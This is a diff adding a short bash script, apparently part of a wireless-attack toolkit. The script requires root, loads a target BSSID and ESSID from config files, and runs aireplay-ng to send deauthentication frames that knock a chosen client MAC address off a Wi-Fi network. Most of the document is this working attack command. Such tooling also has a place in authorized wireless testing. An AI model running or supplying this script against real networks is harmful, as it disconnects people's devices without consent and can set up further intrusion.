@@ -1,0 +1,23 @@
+#!/bin/bash
+
+if [ "$(id -u)" != "0" ]; then
+	echo "This script must be run as root" 1>&2
+	exit 1
+fi
+
+if [ -f ../cfg/target.conf ]; then
+	. ../cfg/target.conf
+else
+	echo "Error: No target set!"
+	exit 1
+fi
+
+. ../cfg/hardware.conf
+
+if [ "$1" == "--client" ]; then
+	echo "Sending DEAUTH request to $2 on $ESSID..."
+	aireplay-ng -0 3 -a $BSSID -c $2 $WLAN
+else
+	echo "Options:"
+	echo "--client [xx:xx:xx:xx:xx:xx] - MAC address of client to bump"
+fi
